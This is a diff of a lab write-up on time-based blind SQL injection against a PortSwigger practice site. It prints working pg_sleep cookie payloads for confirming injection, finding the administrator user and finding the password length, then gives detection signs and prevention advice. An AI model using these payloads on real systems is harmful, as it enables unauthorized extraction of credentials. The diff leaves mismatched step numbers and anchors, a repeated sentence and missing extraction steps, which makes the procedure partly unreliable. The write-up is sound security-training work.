@@ -2,24 +2,22 @@
 
 ## Table of Contents
 
-
 * [Introduction](#introduction)
 * [Attack Flow](#attack-flow)
 * [Why This Attack Works](#why-this-attack-works)
 * [Lab Setup](#lab-setup)
 * [Tools Used](#tools-used)
 * [Prerequisites](#prerequisites)
-  * [Step 1: Setting Up the Lab and Intercepting the Request](#step-1-setting-up-the-lab-and-intercepting-the-request)
-  * [Step 2: Confirming the SQL Injection Point via Time Delay](#step-2-confirming-the-sql-injection-point-via-time-delay)
-  * [Step 3: Testing a False Condition](#step-3-testing-a-false-condition)
-  * [Step 4: Checking if the "administrator" User Exists](#step-4-checking-if-the-administrator-user-exists)
-  * [Step 5: Finding the Password Length](#step-5-finding-the-password-length)
-  * [Step 6: Finding Where the Password Length Check Stops Being True](#step-6-finding-where-the-password-length-check-stops-being-true)
-  * [Step 7: Setting Up Burp Intruder for Character Extraction](#step-7-setting-up-burp-intruder-for-character-extraction)
-  * [Step 8: Making Sure Requests Run One at a Time](#step-8-making-sure-requests-run-one-at-a-time)
-  * [Step 9: Finding the First Character of the Password](#step-9-finding-the-first-character-of-the-password)
-  * [Step 10: Repeating the Attack for Each Remaining Character](#step-10-repeating-the-attack-for-each-remaining-character)
-  * [Step 11: Logging In and Solving the Lab](#step-11-logging-in-and-solving-the-lab)
+  * [Step 1 - Setting Up the Lab and Intercepting the Request](#step-1-setting-up-the-lab-and-intercepting-the-request)
+  * [Step 2 - Confirming the SQL Injection Point with a Time Delay](#step-2-confirming-the-sql-injection-point-with-a-time-delay)
+  * [Step 3 - Testing a False Condition](#step-3-testing-a-false-condition)
+  * [Step 4 - Checking if the "administrator" User Exists](#step-4-checking-if-the-administrator-user-exists)
+  * [Step 5 - Finding the Password Length](#step-5-finding-the-password-length)
+  * [Step 6 - Setting Up Burp Intruder for Character Extraction](#step-7-setting-up-burp-intruder-for-character-extraction)
+  * [Step 7 - Making Sure Requests Run One at a Time](#step-8-making-sure-requests-run-one-at-a-time)
+  * [Step 8 - Finding the First Character of the Password](#step-9-finding-the-first-character-of-the-password)
+  * [Step 9 - Repeating the Attack for Each Remaining Character](#step-10-repeating-the-attack-for-each-remaining-character)
+  * [Step 10 - Logging In and Solving the Lab](#step-11-logging-in-and-solving-the-lab)
 * [How Defenders Can Catch This](#how-defenders-can-catch-this)
 * [How to Prevent It](#how-to-prevent-it)
 * [References](#references)
@@ -77,18 +75,26 @@ This lets me ask the database simple true or false questions. For example, I can
 - Basic understanding of SQL syntax (SELECT, CASE WHEN, SUBSTRING)
 - Knowledge of how cookies are sent in HTTP requests
 
-## Step 1: Setting Up the Lab and Intercepting the Request
+## Step 1 - Setting Up the Lab and Intercepting the Request
 
-I opened the "Blind SQL injection with time delays and information retrieval" lab from PortSwigger Web Security Academy. Before touching anything, I turned on Intercept in Burp Suite's Proxy tab, then visited the lab's front page.
+I opened the **Blind SQL injection with time delays and information retrieval** lab in PortSwigger Web Security Academy.
 
-Once the front page loaded, Burp caught the request going out to the server. Inside this request, I could see the `Cookie` header carrying a `TrackingId` value along with a `session` value:
+Before interacting with the application, I turned **Intercept** on in **Burp Suite** and visited the lab's home page. Burp intercepted the request sent by my browser.
+
+In the request, I found the following `Cookie` header:
 
 ```bash
 Cookie: TrackingId=Q3SWxllcbjggnqJ0; session=LOKQKFvZhhwXB5C847y0LYVn0qFsQrrV
 ```
-I picked `TrackingId` as my target because shopping sites often use cookies like this to track visitors, and the value usually comes straight from a database lookup — which makes it worth testing for SQL injection.
 
-I sent this request to Burp Repeater so I could edit and resend it as many times as I wanted, without reloading the page every time.
+The request contained two cookies:
+
+- `TrackingId` – Used by the application to identify or track the visitor.
+- `session` – Used to keep the current user session active.
+
+I chose the `TrackingId` cookie for testing because tracking cookies are often used in database queries. If the application does not handle the value safely, it can become an SQL injection point.
+
+To make testing easier, I sent the request to **Burp Repeater**. This allowed me to modify the `TrackingId` value and send the same request multiple times without refreshing the page.
 
 <p align="center">
   <img src="images/step1-1.png" width="600">
@@ -100,84 +106,165 @@ I sent this request to Burp Repeater so I could edit and resend it as many times
   <img src="images/step1-3.png" width="600">
 </p>
 
-## Step 2: Confirming the SQL Injection Point via Time Delay
+## Step 2 - Confirming the SQL Injection Point with a Time Delay
 
-Inside Burp Repeater, I changed the `TrackingId` cookie value to this payload, to see if the server would actually run SQL code I put in it:
+In **Burp Repeater**, I modified the `TrackingId` cookie and replaced its value with the following payload:
 
 ```bash
-Q3SWxllcbjggnqJ0' %3BSELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END --
+TrackingId=Q3SWxllcbjggnqJ0' %3BSELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END --
 ```
 **Breakdown**
 
-| Part                          | Description|
-|----------------------------------|-------------------------------------------------------------------|
-| `Q3SWxllcbjggnqJ0'`                    | Random tracking string followed by a single quote to close the original string value so my own SQL can start right after |
-| `%3B`                             | URL-encoded semicolon (`;`) — ends the current statement and starts a new one |
-| `SELECT CASE WHEN (1=1)`          | A condition that's always true, just to check if my code runs at all |
-| `THEN pg_sleep(5)`                | If the condition is true, make PostgreSQL wait 5 seconds          |
-| `ELSE pg_sleep(0)`                | If false, don't wait at all                                       |
-| `END --`                          | Closes the CASE block and comments out the rest of the original query |
+| Part | Description |
+|------|-------------|
+| `Q3SWxllcbjggnqJ0'` | Closes the original string so the injected SQL can be executed. |
+| `%3B` | URL-encoded semicolon (`;`). It ends the original SQL statement and starts a new one. |
+| `SELECT CASE WHEN (1=1)` | A condition that is always true. It is used to check whether the injected SQL is executed. |
+| `THEN pg_sleep(5)` | If the condition is true, PostgreSQL waits for 5 seconds before returning a response. |
+| `ELSE pg_sleep(0)` | If the condition is false, no delay is added. |
+| `END--` | Ends the `CASE` expression and comments out the rest of the original query. |
 
-
-I clicked Send, and the response came back after **5,302 ms** — about 5 seconds, just like I told it to wait. This showed me the cookie value was going directly into a SQL query on the backend, and the server was running whatever I put there. This confirmed the `TrackingId` cookie was vulnerable to **time-based blind SQL injection**.
+After sending the request, the response took about **5,302 ms** to return.
+The delay matched the `pg_sleep(5)` function in the payload. This confirmed that the SQL code inside the `TrackingId` cookie was being executed by the database.
+At this point, I confirmed that the `TrackingId` cookie was vulnerable to **time-based blind SQL injection**.
 
 <p align="center">
   <img src="images/step2-1.png" width="600">
 </p>
 
-## Step 3: Testing a False Condition
+## Step 3 - Testing a False Condition
 
-Next, I wanted to see what happens when the condition is false, so I changed the payload to this:
+To make sure the delay only happened when the condition was true, I changed the payload to use a condition that is always false:
+
 
 ```bash
-Q3SWxllcbjggnqJ0' %3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END--
+TrackingId=Q3SWxllcbjggnqJ0' %3BSELECT CASE WHEN(1=2) THEN pg_sleep(5) ELSE pg_sleep(0) END--
 ```
-Here `1=2` is never true, so the `ELSE` part should run instead, which means no delay at all.
+Since `1=2` is always false, the `ELSE` statement should run, which means the database should not pause before sending the response.
 
-The response came back in just 294 ms, almost instantly. This confirmed I could tell true and false apart just by watching how long the response takes — which is the whole idea behind time-based blind SQL injection.
+After sending the request, the response was returned in about **294 ms**, with no noticeable delay.
+
+Comparing the results:
+
+- **True condition (`1=1`)** → Response delayed by about **5,302 ms**
+- **False condition (`1=2`)** → Response returned immediately
+
+This confirmed that I could determine whether a condition was **true** or **false** by measuring the response time. This is the basic idea behind **time-based blind SQL injection**.
 
 <p align="center">
   <img src="images/step3-1.png" width="600">
 </p>
 
-## Step 4: Checking if the "administrator" User Exists
+## Step 4 - Checking if the "administrator" User Exists
 
-Now that I could tell true from false using timing, I moved on to asking the database a real question — whether a user called `administrator` exists in the `users` table:
+After confirming that I could distinguish **true** and **false** conditions based on the response time, I checked whether the `administrator` user existed in the `users` table.
+
+I used the following payload:
 
 ```bash
-Q3SWxllcbjggnqJ0' %3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--
+TrackingId=Q3SWxllcbjggnqJ0' %3BSELECT CASE WHEN(username='administrator') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--
 ```
 **Breakdown**
 
-| Part   | Description|
-|--------|------------|
-|`WHEN (username='administrator')`|Checks if any row in the table has this exact username|
-|`FROM users`|	Runs this check against the users table|
+| Part | Description |
+|------|-------------|
+| `WHEN (username='administrator')` | Checks whether the current row contains the username `administrator`. |
+| `FROM users` | Runs the check against the `users` table. |
 
-The response took 5,283 ms, showing the delay kicked in. This meant the condition was true — a user named administrator really does exist in the users table.
+After sending the request, the response took about **5,293 ms** to return.
+
+The delay showed that the condition was **true**, confirming that a user named `administrator` exists in the `users` table.
+
+The response took 5,293 ms, showing the delay kicked in. This meant the condition was true — a user named administrator really does exist in the users table.
 
 <p align="center">
   <img src="images/step4-1.png" width="600">
 </p>
 
-## Step 5: Finding the Password Length
+## Step 5 - Finding the Password Length
 
-Now that I knew the `administrator` user exists, the next thing to figure out was how long their password is. I used the `LENGTH()` function to check this one number at a time:
+After confirming that the `administrator` user exists, I started finding the length of the password.
 
-```bash
-Q3SWxllcbjggnqJ0' %3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>=10)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--
-```
-**Breakdown**
-
-| Part   | Description|
-|--------|------------|
-|`AND LENGTH(password)>1`|Checks if the password has more than 1 character, on top of matching the username|
-
-The response took around 5,200 ms, meaning the condition was true — the password is longer than 1 character.
-
-I kept sending the same request, just bumping the number up each time (`>2`, `>3`, `>4`...) and watching for the delay:
+I used the following payload:
 
 ```bash
-Q3SWxllcbjggnqJ0' %3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>2)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--
+TrackingId=Q3SWxllcbjggnqJ0'%3BSELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--
 ```
-This one also came back delayed, around **5,299 ms**, so I kept increasing the number and repeating the same check in Burp Repeater until the delay finally stopped showing up. The number right before the delay disappeared was the actual length of the password.
+
+### Payload Breakdown
+
+| Part | Description |
+|------|-------------|
+| `AND LENGTH(password)>1` | Checks whether the administrator's password is longer than 1 character. |
+
+<p align="center">
+  <img src="images/step5-1.png" width="600">
+</p>
+
+After sending the request, the response took about **5,292 ms**, which meant the condition was **true**. This confirmed that the password was longer than one character.
+
+Next, I increased the number and sent the request again:
+
+```bash
+TrackingId=Q3SWxllcbjggnqJ0'%3BSELECT CASE WHEN (username='administrator' AND LENGTH(password)>2) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--
+```
+<p align="center">
+  <img src="images/step5-2.png" width="600">
+</p>
+
+The response was delayed again, so I continued increasing the value (`>3`, `>4`, `>5`, and so on), sending the request after each change.
+
+After repeating the test with increasing values, I found that the response was delayed up to `LENGTH(password)>19`, this one also came back delayed, around **5,488 ms**. 
+
+```bash
+TrackingId=Q3SWxllcbjggnqJ0'%3BSELECT CASE WHEN (username='administrator' AND LENGTH(password)>19) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--
+```
+<p align="center">
+  <img src="images/step5-3.png" width="600">
+</p>
+
+But the delay stopped when I tested `LENGTH(password)>20`.
+
+```bash
+TrackingId=Q3SWxllcbjggnqJ0'%3BSELECT CASE WHEN (username='administrator' AND LENGTH(password)>20) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--
+```
+
+The response came back in **261 ms**, no delay. which meant the condition was **false**. From these results, I determined that the administrator's password was **20 characters** long.
+
+<p align="center">
+  <img src="images/step5-4.png" width="600">
+</p>
+
+
+
+## Step 11 - Logging In and Solving the Lab
+
+With all 20 characters put together, I now had the full password for the administrator account. I went to the My account login page, entered administrator as the username along with the password I had extracted, and logged in successfully.
+
+The lab was marked as solved.
+
+## How Defenders Can Catch This
+
+| Sign to look for | What it means |
+|---|---|
+| Slow responses from one source | If a certain IP keeps getting responses that take exactly 5s, 10s, or some fixed number, that's not normal traffic — that's someone timing something |
+| Weird keywords in logs | Words like `SLEEP`, `WAITFOR DELAY`, `BENCHMARK`, or `pg_sleep` showing up inside cookie values or form fields in the access logs |
+| The same field getting hit over and over | If one cookie or parameter is being sent with slightly different values, again and again, hundreds of times, that's a brute-force pattern, which is exactly what Intruder does |
+| Database slow query logs | The database itself will show query execution times spiking way above normal, right around the same time as the suspicious requests |
+
+## How to Prevent It
+
+- Use parameterized queries or prepared statements everywhere user input touches a query, never build SQL by joining strings together with input mixed in
+- Validate and clean up every piece of input before it goes anywhere near the database
+- If using an ORM, stick to its query builder instead of writing raw SQL by hand
+- Put a WAF in front of the app to catch and block obvious keywords like SLEEP, WAITFOR, BENCHMARK
+- Give the database user account the least amount of access it actually needs, so even if injection happens, the damage is limited
+- Set a timeout on how long a single query is allowed to run, so an attacker can't force the database to hang for several seconds
+
+## Lesson Learned
+
+- Even when an app shows nothing on screen, no error, no extra data, it can still leak information through something as simple as response time
+- Blind doesn't mean safe. If input reaches a query unfiltered, there's always some way to pull data out, it just takes more patience
+- Running requests one at a time matters a lot in timing attacks. Sending them too fast or in parallel ruins the whole measurement
+- Breaking a big unknown (a 20 character password) into small yes/no questions is what makes this kind of attack possible at all
+- This attack is slow and takes a lot of requests, but it works even against a database that gives away nothing else
